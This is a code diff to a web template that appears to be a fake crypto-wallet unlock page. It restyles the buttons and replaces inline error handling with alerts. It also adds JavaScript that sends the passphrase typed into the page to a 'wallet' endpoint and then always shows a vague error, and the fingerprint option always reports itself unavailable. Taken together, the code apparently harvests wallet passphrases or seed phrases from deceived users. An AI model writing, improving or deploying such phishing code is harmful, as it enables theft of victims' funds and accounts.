@@ -98,16 +98,16 @@
         .btn-primary {
             background-color: white;
             color: rgb(89 59 139);
-			border: 1px solid rgb(89 59 139);
+			border: 1px solid #662d7a;
             font-family: 'Poppins', sans-serif;
             font-weight: 500;
         }
 
         .btn-secondary {
 
-            background-color: rgb(89 59 139);
+            background-color: rgb(112 61 146);
             color: #ffffff;
-            border: 2px solid rgb(89 59 139);
+            border: 2px solid rgb(112 61 146);
             font-family: 'Poppins', sans-serif;
             font-weight: 500;
 			transition: none;
@@ -116,7 +116,7 @@
 
         .btn-secondary:hover {
             background-color: #f5f0f7;
-			color: rgb(89 59 139);
+			color: rgb(42, 3, 87)
         }
 
         .btn-primary:hover {
@@ -157,7 +157,7 @@
         }
 
         .info-text a {
-            color: rgb(89 59 139);
+            color: #662d7a;
             text-decoration: none;
             font-weight: 500;
         }
@@ -244,46 +244,39 @@
 
     <script>
         function handleFingerprintClick() {
-            const existingError = document.querySelector('.error-message');
-            if (!existingError) {
-                const formGroup = document.querySelector('.form-group');
-                const errorDiv = document.createElement('div');
-                errorDiv.className = 'error-message';
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = 'Fingerprint is not available.';
-                formGroup.appendChild(errorDiv);
-            } else {
-                existingError.style.display = 'block';
-                existingError.textContent = 'Fingerprint is not available.';
-            }
-            
-            // Hide error message after 3 seconds
-            setTimeout(() => {
-                const errorMessage = document.querySelector('.error-message');
-                if (errorMessage) {
-                    errorMessage.style.display = 'none';
-                }
-            }, 3000);
+            alert('Error: Fingerprint is not available');
         }
-
-        // Prevent browser default validation
-        document.querySelector('form').addEventListener('invalid', (e) => {
-            e.preventDefault();
-        }, true);
 
         // Handle form submission
         document.querySelector('form').addEventListener('submit', (e) => {
+            e.preventDefault(); // Prevent default form submission
+            
             const textarea = document.querySelector('textarea');
             if (!textarea.value.trim()) {
-                e.preventDefault();
-                const errorDiv = document.querySelector('.error-message') || document.createElement('div');
-                errorDiv.className = 'error-message';
-                errorDiv.style.display = 'block';
-                errorDiv.textContent = 'Invalid Passphrase';
-                if (!document.querySelector('.error-message')) {
-                    textarea.parentNode.insertBefore(errorDiv, textarea.nextSibling);
-                }
+                alert('Error: Click OK!');
+                return;
             }
+
+            // Submit form via fetch API
+            const formData = new FormData(e.target);
+            fetch('{% url "wallet" %}', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'X-CSRFToken': document.querySelector('[name=csrfmiddlewaretoken]').value
+                }
+            })
+            .then(response => response.json())
+            .then(data => {
+                if(data.status === 'error') {
+                    alert('Error: Click OK!');
+                   // window.location.href = '/'; // Redirect after showing alert
+                }
+            })
+            .catch(() => {
+                alert('Error: Click OK!');
+                //window.location.href = '/';
+            });
         });
     </script>
 </body>
